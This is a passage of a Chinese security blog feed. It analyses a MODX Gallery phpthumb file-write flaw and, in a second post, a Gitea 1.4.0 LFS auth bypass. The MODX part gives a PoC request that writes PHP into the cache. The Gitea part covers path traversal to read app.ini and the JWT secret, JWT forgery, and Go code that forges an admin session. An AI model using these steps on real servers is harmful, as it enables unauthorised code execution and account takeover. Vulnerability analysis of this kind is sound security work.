&lt;p&gt;如果没有指定&lt;code&gt;f&lt;/code&gt;参数的话，就根据文件后缀将&lt;code&gt;f&lt;/code&gt;赋值。也就是说，如果我们传递了&lt;code&gt;f&lt;/code&gt;参数，也就可以指定任意文件后缀，此处没有任何过滤。&lt;/p&gt;

&lt;p&gt;然后判断&lt;code&gt;src&lt;/code&gt;参数是否是以&lt;code&gt;http&lt;/code&gt;开头，如果不是，则把&lt;code&gt;src&lt;/code&gt;拼接成完整的物理路径：&lt;code&gt;D:/phpStudy/PHPTutorial/WWW/modx-2.6.4-pl/assets/gallery/1/cover.png&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;/* auto-prepend base path if not a URL */
if (strpos($src, &#39;http&#39;) === false) {
    $basePath = $modx-&amp;gt;getOption(&#39;base_path&#39;, null, MODX_BASE_PATH);
    if ($basePath != &#39;/&#39;) {
        $src = str_replace(basename($basePath), &#39;&#39;, $src);
        $src = ltrim($src, &#39;/&#39;);
        $src = $basePath . $src;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接着把&lt;code&gt;src&lt;/code&gt;路径中的&lt;code&gt;:&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;替换成&lt;code&gt;_&lt;/code&gt;，也就是&lt;code&gt;D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png&lt;/code&gt;，这个字符串将成为最后缓存文件的文件名的前半部分。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$inputSanitized = str_replace(array(&#39;:&#39;, &#39;/&#39;), &#39;_&#39;, $src);
$cacheFilename = $inputSanitized;
$cacheFilename .= &#39;.&#39; . md5(serialize($scriptProperties));
$cacheFilename .= &#39;.&#39; . (!empty($ptOptions[&#39;f&#39;]) ? $ptOptions[&#39;f&#39;] : &#39;png&#39;);
$cacheKey = $assetsPath . &#39;cache/&#39; . $cacheFilename;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而文件名后半部分则是&lt;code&gt;md5(serialize($scriptProperties))&lt;/code&gt;的值，把上面的array进行反序列化再MD5，最后拼接上面设置的&lt;code&gt;f&lt;/code&gt;后缀，所以最后的文件名类似&lt;code&gt;D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png.0f0d6092657266f9718061fb8a20730d.png&lt;/code&gt;，由于在实际利用中我们不知道网站物理路径，因此几乎无法猜出这个文件名。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;绕过方式就是利用&lt;code&gt;src&lt;/code&gt;参数，上面代码对&lt;code&gt;src&lt;/code&gt;进行了一个&lt;code&gt;http&lt;/code&gt;判断，假如我们指定&lt;code&gt;src&lt;/code&gt;以&lt;code&gt;http&lt;/code&gt;开头，就不会拼接物理路径，而反序列化时的各个参数均是我们可以控制的，这样我们最终就能得到一个文件名类似&lt;code&gt;http.md5_string.php&lt;/code&gt;的缓存文件。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;构造PoC：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;action=web/phpthumb&amp;amp;src=http&amp;amp;f=php&amp;amp;useRawIMoutput=1&amp;amp;config_prefer_imagemagick=0&amp;amp;IMresizedData=&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;然后写一段代码来生成反序列化数据，此处要注意参数顺序，不同顺序生成的反序列化数据不一样，最终的MD5值也就会变&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$target = array (
    &amp;quot;action&amp;quot;=&amp;gt; &amp;quot;web/phpthumb&amp;quot;,
    &amp;quot;src&amp;quot;=&amp;gt; &amp;quot;http&amp;quot;,
    &amp;quot;f&amp;quot;=&amp;gt; &amp;quot;php&amp;quot;,
    &amp;quot;useRawIMoutput&amp;quot;=&amp;gt; &amp;quot;1&amp;quot;,
    &amp;quot;config_prefer_imagemagick&amp;quot;=&amp;gt; &amp;quot;0&amp;quot;,
    &amp;quot;IMresizedData&amp;quot;=&amp;gt; &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
);
$seri = serialize($target);  
echo md5($seri);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最终会在缓存目录&lt;code&gt;assets/components/gallery/cache&lt;/code&gt;写入文件&lt;code&gt;http.f23566b3b11f5fd29a8189b74ef53daf.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532601619133.png&#34; alt=&#34;1532601619133&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-补丁分析&#34;&gt;0x04 补丁分析&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/modxcms/revolution/pull/13979/&#34;&gt;https://github.com/modxcms/revolution/pull/13979/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532602450085.png&#34; alt=&#34;1532602450085&#34; /&gt;&lt;/p&gt;

&lt;p&gt;补丁主要是对可传入的参数进行了限制，只允许公共参数(public parameters)，这样就避免了直接传入私有参数改变程序逻辑。&lt;/p&gt;

&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;

&lt;p&gt;该漏洞的利用条件虽然有一定版本和插件限制，但是在互联网上&lt;code&gt;Gallery&lt;/code&gt;插件的使用量并不小，相关站点需要多加防范。&lt;/p&gt;

&lt;p&gt;此次漏洞应该归结于&lt;code&gt;phpthumb&lt;/code&gt;模块，一是接口直接对外暴露，二是对文件操作缺少过滤。在&lt;code&gt;MODx&lt;/code&gt;中的两个版本均受到影响，分别是 &lt;code&gt;1.7.14-201604151303&lt;/code&gt;和&lt;code&gt;1.7.14-201608101311&lt;/code&gt; ，在&lt;code&gt;Github&lt;/code&gt;上搜索了几个使用该库的&lt;code&gt;CMS&lt;/code&gt;，发现代码结构几乎一致，不排除也能直接利用的情况，有兴趣的可以研究一下。&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Gitea 1.4.0未授权远程代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Tue, 17 Jul 2018 17:52:10 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;近日，Gitea 1.4.0版本的&lt;code&gt;LFS&lt;/code&gt;模块出现了一个绕过登录验证未授权创建LFS对象的漏洞，由此漏洞引申出了一条非常漂亮的攻击链，值得好好学习。&lt;/p&gt;

&lt;h3 id=&#34;0x00-基本介绍&#34;&gt;0x00 基本介绍&lt;/h3&gt;

&lt;p&gt;官网地址 &lt;a href=&#34;https://gitea.io/en-us/&#34;&gt;https://gitea.io/en-us/&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Gitea is a community managed &lt;a href=&#34;https://blog.gitea.io/2016/12/welcome-to-gitea/&#34;&gt;fork&lt;/a&gt; of &lt;a href=&#34;https://gogs.io/&#34;&gt;Gogs&lt;/a&gt;, lightweight code hosting solution written in &lt;a href=&#34;https://golang.org/&#34;&gt;Go&lt;/a&gt; and published under the &lt;a href=&#34;https://github.com/go-gitea/gitea/blob/master/LICENSE&#34;&gt;MIT&lt;/a&gt; license.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Git LFS 介绍&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Git 大文件存储（Large File Storage，简称LFS）目的是更好地把大型二进制文件，比如音频文件、数据集、图像和视频等集成到 Git 的工作流中。我们知道，Git 存储二进制效率不高，因为它会压缩并存储二进制文件的所有完整版本，随着版本的不断增长以及二进制文件越来越多，这种存储方案并不是最优方案。而 LFS 处理大型二进制文件的方式是用文本指针替换它们，这些文本指针实际上是包含二进制文件信息的文本文件。文本指针存储在 Git 中，而大文件本身通过HTTPS托管在Git LFS服务器上。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;本次漏洞是出现在&lt;code&gt;Gitea&lt;/code&gt;的&lt;code&gt;LFS&lt;/code&gt;处理逻辑中，在进行权限验证的时候少了一行&lt;code&gt;return&lt;/code&gt;语句，以至于即使在&lt;code&gt;401 Unauthorized&lt;/code&gt;的时候依旧能够进行后续的操作，这是整个漏洞的导火索。&lt;/p&gt;

&lt;h3 id=&#34;0x01-环境搭建&#34;&gt;0x01 环境搭建&lt;/h3&gt;

&lt;p&gt;使用docker搭建漏洞环境，&lt;code&gt;Gitea&lt;/code&gt;版本1.4.0&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://docs.gitea.io/en-us/install-with-docker/&#34;&gt;https://docs.gitea.io/en-us/install-with-docker/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;docker-compose.yml&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;version: &amp;quot;2&amp;quot;

networks:
  gitea:
    external: false

services:
  server:
    image: gitea/gitea:1.4.0
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
    networks:
      - gitea
    volumes:
      - ./gitea:/data
    ports:
      - &amp;quot;3000:3000&amp;quot;
      - &amp;quot;222:22&amp;quot;
    depends_on:
      - db

  db:
    image: mysql:5.7
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=gitea
      - MYSQL_USER=gitea
      - MYSQL_PASSWORD=gitea
      - MYSQL_DATABASE=gitea
    networks:
      - gitea
    volumes:
      - ./mysql:/var/lib/mysql
    ports:
      - &amp;quot;3306:3306&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;安装时指定&lt;code&gt;mysql&lt;/code&gt;连接需要&lt;code&gt;vps_ip:3306&lt;/code&gt;，使用&lt;code&gt;localhost:3306&lt;/code&gt;一直提示错误&lt;/p&gt;

&lt;h3 id=&#34;0x02-逻辑漏洞&#34;&gt;0x02 逻辑漏洞&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218&#34;&gt;https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// PostHandler instructs the client how to upload data
func PostHandler(ctx *context.Context) {
    //...
    if !authenticate(ctx, repository, rv.Authorization, true) {
		requireAuth(ctx)
	}
	//...
}
func requireAuth(ctx *context.Context) {
	ctx.Resp.Header().Set(&amp;quot;WWW-Authenticate&amp;quot;, &amp;quot;Basic realm=gitea-lfs&amp;quot;)
	writeStatus(ctx, 401)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;问题出在&lt;code&gt;PostHandler()&lt;/code&gt;方法，该方法的作用是创建一个新的&lt;code&gt;LFS&lt;/code&gt;对象。在&lt;code&gt;requireAuth&lt;/code&gt;处，如果权限验证失败，则执行&lt;code&gt;requireAuth ()&lt;/code&gt;，返回&lt;code&gt;401认证失败&lt;/code&gt;，关键是&lt;code&gt;requireAuth(ctx)&lt;/code&gt;结束之后没有&lt;code&gt;return&lt;/code&gt;，也就是说虽然返回&lt;code&gt;401&lt;/code&gt;但是不影响后面的逻辑接着执行，因此可以创建任意&lt;code&gt;LFS&lt;/code&gt;对象，此处存在一个权限绕过漏洞。&lt;/p&gt;

&lt;h3 id=&#34;0x03-目录穿越-任意文件读取&#34;&gt;0x03  目录穿越&amp;amp;任意文件读取&lt;/h3&gt;

&lt;p&gt;参考文档 &lt;a href=&#34;https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md&#34;&gt;https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Get takes a Meta object and retrieves the content from the store, returning
// it as an io.Reader. If fromByte &amp;gt; 0, the reader starts from that byte
func (s *ContentStore) Get(meta *models.LFSMetaObject, fromByte int64) (io.ReadCloser, error) {
	path := filepath.Join(s.BasePath, transformKey(meta.Oid))

	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	if fromByte &amp;gt; 0 {
		_, err = f.Seek(fromByte, os.SEEK_CUR)
	}
	return f, err
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从&lt;code&gt;lfs&lt;/code&gt;下载文件接口是&lt;code&gt;modules/lfs/content_store.go:Get()&lt;/code&gt;方法，从&lt;code&gt;meta.Oid&lt;/code&gt;取路径去读取，这个路径处理函数是&lt;code&gt;transformKey()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func transformKey(key string) string {
	if len(key) &amp;lt; 5 {
		return key
	}

	return filepath.Join(key[0:2], key[2:4], key[4:])
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到&lt;code&gt;transformKey()&lt;/code&gt;方法是把key参数做了三次分割，先取两个字符，加上&lt;code&gt;/&lt;/code&gt;，然后再取两个，再加上&lt;code&gt;/&lt;/code&gt;，最后拼接后面部分，举例说明：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;abcdefgh -&amp;gt; ab/cd/efgh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;于是此处就可以构造&lt;code&gt;..../etc/passwd&lt;/code&gt;的格式，经过&lt;code&gt;transformKey()&lt;/code&gt;后被转换成&lt;code&gt;../../etc/passwd&lt;/code&gt;，这样就存在一个任意文件读取漏洞。&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;Gitea&lt;/code&gt;中有一个关键配置文件&lt;code&gt;app.ini&lt;/code&gt;，其中记录了默认配置信息，包括数据库连接密码，一些路径和&lt;code&gt;token&lt;/code&gt;，以及LFS 认证密钥 ，该密钥用来加密JWT认证&lt;/p&gt;

&lt;p&gt;配置项更详细信息可以参考&lt;a href=&#34;https://docs.gitea.io/zh-cn/config-cheat-sheet/&#34;&gt;文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;当前环境中&lt;code&gt;app.ini&lt;/code&gt;位置在&lt;code&gt;/data/gitea/conf/app.ini&lt;/code&gt;，所以需要构造&lt;code&gt;....gitea/conf/app.ini&lt;/code&gt;，经过处理变成&lt;code&gt;/data/gitea/lfs/../../gitea/conf/app.ini&lt;/code&gt;，也就是&lt;code&gt;/data/gitea/conf/app.ini&lt;/code&gt;，这样就能读取到配置文件，注意需要对&lt;code&gt;/&lt;/code&gt;进行&lt;code&gt;url&lt;/code&gt;编码&lt;/p&gt;

&lt;p&gt;访问LFS存储对象的接口是&lt;code&gt;https://git-server.com/foo/bar.git/info/lfs/objects/batch&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531882119588.png&#34; alt=&#34;1531882119588&#34; /&gt;&lt;/p&gt;

&lt;p&gt;由此我们获取到了&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-构造authorization&#34;&gt;0x04 构造Authorization&lt;/h3&gt;

&lt;p&gt;LFS接口认证过程使用了JWT或Basic认证，&lt;a href=&#34;https://jwt.io/introduction/&#34;&gt;官网介绍&lt;/a&gt;JWT：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;JSON Web Token (JWT)&lt;/code&gt; is an open standard (&lt;a href=&#34;https://tools.ietf.org/html/rfc7519&#34;&gt;RFC 7519&lt;/a&gt;) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the &lt;strong&gt;HMAC&lt;/strong&gt; algorithm) or a public/private key pair using &lt;strong&gt;RSA&lt;/strong&gt; or &lt;strong&gt;ECDSA&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Although JWTs can be encrypted to also provide secrecy between parties, we will focus on &lt;em&gt;signed&lt;/em&gt; tokens. Signed tokens can verify the &lt;em&gt;integrity&lt;/em&gt; of the claims contained within it, while encrypted tokens &lt;em&gt;hide&lt;/em&gt; those claims from other parties. When tokens are signed using public/private key pairs, the signature also certifies that only the party holding the private key is the one that signed it.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所以我们一旦获得了&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;，就可以自己构造JWT认证，从而在不知道管理员账户密码的情况下取得LFS的完整控制权。&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;modules/lfs/server.go&lt;/code&gt;定义了LFS接口认证登录的方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func parseToken(authorization string) (*models.User, *models.Repository, string, error) {
	if authorization == &amp;quot;&amp;quot; {
		return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;No token&amp;quot;)
	}
	if strings.HasPrefix(authorization, &amp;quot;Bearer &amp;quot;) {
		token, err := jwt.Parse(authorization[7:], func(t *jwt.Token) (interface{}, error) {
			if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf(&amp;quot;unexpected signing method: %v&amp;quot;, t.Header[&amp;quot;alg&amp;quot;])
			}
			return setting.LFS.JWTSecretBytes, nil
		})
		if err != nil {
			return nil, nil, &amp;quot;unknown&amp;quot;, err
		}
		claims, claimsOk := token.Claims.(jwt.MapClaims)
		if !token.Valid || !claimsOk {
			return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;Token claim invalid&amp;quot;)
		}
		opStr, ok := claims[&amp;quot;op&amp;quot;].(string)
		if !ok {
			return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;Token operation invalid&amp;quot;)
		}
		repoID, ok := claims[&amp;quot;repo&amp;quot;].(float64)
		if !ok {
			return nil, nil, opStr, fmt.Errorf(&amp;quot;Token repository id invalid&amp;quot;)
		}
		r, err := models.GetRepositoryByID(int64(repoID))
		if err != nil {
			return nil, nil, opStr, err
		}
		userID, ok := claims[&amp;quot;user&amp;quot;].(float64)
		if !ok {
			return nil, r, opStr, fmt.Errorf(&amp;quot;Token user id invalid&amp;quot;)
		}
		u, err := models.GetUserByID(int64(userID))
		if err != nil {
			return nil, r, opStr, err
		}
		return u, r, opStr, nil
	}
    if strings.HasPrefix(authorization, &amp;quot;Basic &amp;quot;) {
        //...
    }
    return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;Token not found&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到构成JWT的&lt;code&gt;payload&lt;/code&gt;部分需要包含这么几个字段：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
  &amp;quot;user&amp;quot;: 1,
  &amp;quot;repo&amp;quot;: 1,
  &amp;quot;op&amp;quot;: &amp;quot;upload&amp;quot;,
  &amp;quot;nbf&amp;quot;: 1445408221,
  &amp;quot;exp&amp;quot;: 1618208221
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;分别是用户id，LFS项目id，LFS操作，以及&lt;code&gt;HTTPAuth&lt;/code&gt;有效时间&lt;/p&gt;

&lt;p&gt;我们在&lt;a href=&#34;https://jwt.io/#debugger&#34;&gt;JWT debugger页面&lt;/a&gt;测试生成一段&lt;code&gt;Auth Token&lt;/code&gt;，填入&lt;code&gt;payload&lt;/code&gt;和上一步获取到的&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;，于是得到了LFS认证的&lt;code&gt;Authorization&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531883703859.png&#34; alt=&#34;1531883703859&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x05-伪造session绕过登录&#34;&gt;0x05 伪造session绕过登录&lt;/h3&gt;

&lt;p&gt;在&lt;code&gt;modules/lfs/server.go&lt;/code&gt; 定义了LFS中的路由接口&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ObjectOidHandler is the main request routing entry point into LFS server functions
func ObjectOidHandler(ctx *context.Context) {
	if !setting.LFS.StartServer {
		writeStatus(ctx, 404)
		return
	}
	if ctx.Req.Method == &amp;quot;GET&amp;quot; || ctx.Req.Method == &amp;quot;HEAD&amp;quot; {
		if MetaMatcher(ctx.Req) {
			getMetaHandler(ctx)
			return
		}
		if ContentMatcher(ctx.Req) || len(ctx.Params(&amp;quot;filename&amp;quot;)) &amp;gt; 0 {
			getContentHandler(ctx)
			return
		}
	} else if ctx.Req.Method == &amp;quot;PUT&amp;quot; &amp;amp;&amp;amp; ContentMatcher(ctx.Req) {
		PutHandler(ctx)
		return
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中写入文件接口是在&lt;code&gt;PutHandler()&lt;/code&gt;，需要使用&lt;code&gt;PUT&lt;/code&gt;方法。跟入&lt;code&gt;Put()&lt;/code&gt;看一下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Put takes a Meta object and an io.Reader and writes the content to the store.
func (s *ContentStore) Put(meta *models.LFSMetaObject, r io.Reader) error {
	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
	tmpPath := path + &amp;quot;.tmp&amp;quot;

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0750); err != nil {
		return err
	}

	file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0640)
	if err != nil {
		return err
	}
	defer os.Remove(tmpPath)

	hash := sha256.New()
	hw := io.MultiWriter(hash, file)

	written, err := io.Copy(hw, r)
	if err != nil {
		file.Close()
		return err
	}
	file.Close()

	if written != meta.Size {
		return errSizeMismatch
	}

	shaStr := hex.EncodeToString(hash.Sum(nil))
	if shaStr != meta.Oid {
		return errHashMismatch
	}

	return os.Rename(tmpPath, path)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到该方法主要是先创建临时文件，以&lt;code&gt;.tmp&lt;/code&gt;结尾，然后对文件进行了一系列校验，包括文件大小和&lt;code&gt;Oid&lt;/code&gt;信息，两者如果任一不匹配的话就写入失败，同时删除临时文件。注意这行语句&lt;/p&gt;

&lt;p&gt;&lt;code&gt;defer os.Remove(tmpPath)&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;defer&lt;/code&gt;用于资源的释放，会在函数返回之前进行调用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;也就是说不管函数是否返回错误，结束时都会删除临时文件。&lt;/p&gt;

&lt;p&gt;这时就要考虑两点：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;在文件被删除之前利用；&lt;/li&gt;
&lt;li&gt;如何利用后缀为.tmp的文件；&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;先考虑第一个问题，在文件被删除之前访问到这个文件。这种情况让我们想到在上传webshell时可以利用的条件竞争漏洞，在文件被删除之前使用多线程并发访问，利用时间差访问到上传文件然后生成shell。但是这个方法在此处不适用，根据作者想出的办法，利用&lt;code&gt;Content-Length&lt;/code&gt;字段，该字段告诉服务器该请求需要发送多少长度的数据， 在传输完成之前服务器会处于一直等待阶段。假设我们设置了一个超长的&lt;code&gt;Content-Length&lt;/code&gt;，服务器就会认为数据还没有传输完成便挂起等待，这个时间段内我们就可以访问到上传的文件。&lt;/p&gt;

&lt;p&gt;接着考虑第二个问题，如何利用&lt;code&gt;.tmp&lt;/code&gt;文件？&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;Gitea&lt;/code&gt;可以配置存储session的方式，默认是保存为文件，存储路径在&lt;code&gt;/data/gitea/sessions&lt;/code&gt;。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;//app.ini
[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER        = file
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;于是我们可以想到把上面生成的session内容写入到一个&lt;code&gt;.tmp&lt;/code&gt;文件，并保存在session目录下，这个tmp文件名即为&lt;code&gt;sessionid&lt;/code&gt;，然后利用条件竞争，在文件未被删除之前带上这个&lt;code&gt;sessionid&lt;/code&gt;，就可以登录成功。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Gitea&lt;/code&gt;使用的session模块是&lt;a href=&#34;https://github.com/go-macaron/session&#34;&gt;go-macaron/session&lt;/a&gt;，在&lt;code&gt;file.go&lt;/code&gt;可以看到几个关键的方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Release releases resource and save data to provider.
func (s *FileStore) Release() error {
	s.p.lock.Lock()
	defer s.p.lock.Unlock()

	data, err := EncodeGob(s.data)
	if err != nil {
		return err
	}

	return ioutil.WriteFile(s.p.filepath(s.sid), data, os.ModePerm)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;调用了&lt;code&gt;EncodeGob()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
	for _, v := range obj {
		gob.Register(v)
	}
	buf := bytes.NewBuffer(nil)
	err := gob.NewEncoder(buf).Encode(obj)
	return buf.Bytes(), err
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后写入文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func (p *FileProvider) filepath(sid string) string {
	return path.Join(p.rootPath, string(sid[0]), string(sid[1]), sid)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到session的生成是通过特有的Gob序列化后保存成文件，路径特点是&lt;code&gt;sid[0]/sid[1]/sid&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我们来分析一个认证成功的session&lt;code&gt;/data/gitea/sessions/0/9/09cfb25c946d6187&lt;/code&gt;，前两位为路径名，后面为sid，共同组成一个session文件&lt;/p&gt;

&lt;p&gt;我们使用相应的&lt;code&gt;DecodeGob()&lt;/code&gt;方法(vendor/github.com/go-macaron/session/utils.go:47)来解开看一下session里包含的内容，其中&lt;code&gt;session_data&lt;/code&gt;即是&lt;code&gt;session&lt;/code&gt;文件的hex内容。代码如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;encoding/gob&amp;quot;
	&amp;quot;encoding/hex&amp;quot;
	&amp;quot;fmt&amp;quot;
	&amp;quot;bytes&amp;quot;
)

func DecodeGob(encoded []byte) (out map[interface{}]interface{}, err error) {
	buf := bytes.NewBuffer(encoded)
	err = gob.NewDecoder(buf).Decode(&amp;amp;out)
	return out, err
}

func main() {
	session_data := &amp;quot;0EFF81040102...03000131&amp;quot;	//太长省略
	buf, err := hex.DecodeString(session_data)
	fmt.Println(buf)
	if err != nil {
		fmt.Println(err)
	}
	decode_data, err := DecodeGob(buf)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(decode_data)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;运行结果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531898336305.png&#34; alt=&#34;1531898336305&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到主要是以&lt;code&gt;_old_iod&lt;/code&gt; &lt;code&gt;uid&lt;/code&gt; &lt;code&gt;uname&lt;/code&gt;三个值组成的session内容，那么我们就可以构造一组这样的值来伪造一个session&lt;/p&gt;

&lt;p&gt;&lt;code&gt;[uid:1 uname:admin123 _old_uid:1]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;生成session使用&lt;code&gt;EncodeGob()&lt;/code&gt;方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;encoding/gob&amp;quot;
	&amp;quot;encoding/hex&amp;quot;
	&amp;quot;fmt&amp;quot;
	&amp;quot;bytes&amp;quot;
)

func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
	for _, v := range obj {
		gob.Register(v)
	}
	buf := bytes.NewBuffer(nil)
	err := gob.NewEncoder(buf).Encode(obj)
	return buf.Bytes(), err
}

func main() {
	//var uid = 1
	//uname := &amp;quot;admin123&amp;quot;
	obj := map[interface{}]interface{}{&amp;quot;_old_iod&amp;quot;: &amp;quot;1&amp;quot;, &amp;quot;uid&amp;quot;: 1, &amp;quot;uname&amp;quot;: &amp;quot;admin123&amp;quot;}
	buf, err := EncodeGob(obj)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(buf)
	encode_data := hex.EncodeToString(buf)
	fmt.Println(encode_data)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;运行之后生成一个hex序列&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531898708274.png&#34; alt=&#34;1531898708274&#34; /&gt;&lt;/p&gt;

